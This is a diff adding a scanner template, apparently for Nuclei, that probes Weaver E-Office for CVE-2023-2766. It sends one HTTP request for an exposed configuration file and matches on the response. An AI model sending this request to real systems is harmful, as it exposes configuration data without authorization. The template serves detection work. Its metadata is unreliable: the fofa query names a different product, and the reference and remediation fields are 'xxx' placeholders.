@@ -1,0 +1,29 @@
+id: Information_leakage
+info:
+  name: 泛微E-Office信息泄露漏洞(CVE-2023-2766)
+  author: mike
+  severity: info
+  description: xxxWeaver E-Office是中国泛微科技（Weaver）公司的一个协同办公系统。Weaver E-Office 9.5版本存在安全漏洞。攻击者利用该漏洞可以访问文件或目录。
+  reference: xxx
+  remediation: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-U8-Cloud"
+http:
+  - raw:
+      - |
+        GET /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "sport"
